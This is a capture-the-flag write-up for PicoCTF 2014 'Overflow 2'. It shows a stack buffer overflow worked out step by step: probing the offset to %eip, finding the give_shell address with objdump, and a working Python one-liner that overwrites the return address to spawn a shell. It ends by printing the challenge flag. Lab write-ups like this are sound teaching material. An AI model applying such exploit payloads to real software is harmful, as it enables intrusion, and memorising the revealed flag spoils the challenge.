# Pico CTF 2014 : Overflow 2

**Category:** Binary Exploitation
**Points:** 70
**Description:**

>This problem has a buffer overflow vulnerability! Can you get a shell? You can solve this problem interactively [here](https://picoctf.com/problem-static/binary/Overflow2/overflow2.html), and the source can be found here(overflow2.c).

**Hint:**
>How can you run the give_shell function?

## Write-up

This program has a similar vulnerability to [Overflow 1](../overflow-1-50). The
main difference is that this time we will gain control over the program flow.
Let's supply some bytes and see what happens:
```
/home/overflow2$ strace ./overflow2 $(python -c 'print "A"*28 + "BBBB"')
...
--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x42424242} ---
```

A bit of trial and error will reveal we control `%eip` after 28 bytes. Now all
we need is a convenient function to jump to! Let's look at the source:
```
/* This never gets called! */
void give_shell()
```
Luckily for us, PIE is not enabled, meaning we can supply the address of this
function to the program!

```
/home/overflow2$ objdump -d overflow2 | grep give_shell
080484ad <give_shell>:
```

Now all we have to do is convert that address into an escape sequence for
python and then convert it to little endian. We get this exploit:
```
/home/overflow2$ ./overflow2 $(python -c 'print "A"*28 + "\xad\x84\x04\x08"')
$ ls
flag.txt  Makefile  overflow2  overflow2.c
$ cat flag.txt
controlling_%eip_feels_great
```



## Other write-ups and resources

* <http://ehsandev.com/pico2014/binary_exploitation/overflow_2.html>
* <https://ctf-team.vulnhub.com/picoctf-2014-overflow-2/>
